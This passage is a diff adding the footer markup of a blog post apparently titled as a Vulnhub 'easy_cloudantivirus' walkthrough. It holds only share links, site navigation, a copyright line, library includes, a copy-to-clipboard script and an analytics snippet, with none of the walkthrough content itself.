+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/&text=Vulnhub靶机之easy_cloudantivirus"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/&title=Vulnhub靶机之easy_cloudantivirus"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/&is_video=false&description=Vulnhub靶机之easy_cloudantivirus"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Vulnhub靶机之easy_cloudantivirus&body=Check out this article: http://example.com/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/&title=Vulnhub靶机之easy_cloudantivirus"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/&title=Vulnhub靶机之easy_cloudantivirus"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/&title=Vulnhub靶机之easy_cloudantivirus"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/&title=Vulnhub靶机之easy_cloudantivirus"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/&name=Vulnhub靶机之easy_cloudantivirus&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/&t=Vulnhub靶机之easy_cloudantivirus"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2022
+    Rsherhan
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Categories</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Articles</a></li><!--
+     --><!--
+       --><li><a href="/links/">Links</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+    <script async src="https://www.googletagmanager.com/gtag/js?id=3341494857"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        gtag('config', '3341494857');
+    </script>
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
